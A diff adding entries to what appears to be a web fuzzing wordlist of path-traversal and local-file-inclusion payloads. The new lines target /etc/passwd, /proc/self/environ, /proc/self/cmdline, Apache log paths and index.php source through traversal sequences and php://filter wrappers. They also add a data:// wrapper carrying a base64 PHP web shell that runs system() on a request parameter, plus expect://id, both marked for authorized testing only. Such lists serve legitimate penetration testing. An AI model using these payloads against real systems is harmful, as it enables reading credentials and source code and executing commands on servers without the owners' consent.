@@ -45,3 +45,20 @@ data://text/plain,probe
 ..;/..;/..;/etc/passwd
 # Absolute with forward slashes windows
 C:/windows/win.ini
+# /proc/self/environ canary
+../../../../proc/self/environ
+# /proc/self/cmdline canary
+../../../../proc/self/cmdline
+# URL-encoded environ
+..%2f..%2f..%2fproc%2fself%2fenviron
+# Apache access log default paths
+../../../../var/log/apache2/access.log
+../../../../var/log/httpd/access_log
+# PHP filter wrapper on passwd (base64)
+php://filter/convert.base64-encode/resource=/etc/passwd
+# PHP filter wrapper on index source
+php://filter/convert.base64-encode/resource=index.php
+# data:// wrapper probe (RCE vector, authorized testing only)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=
+# Expect wrapper (legacy RCE, authorized testing only)
+expect://id
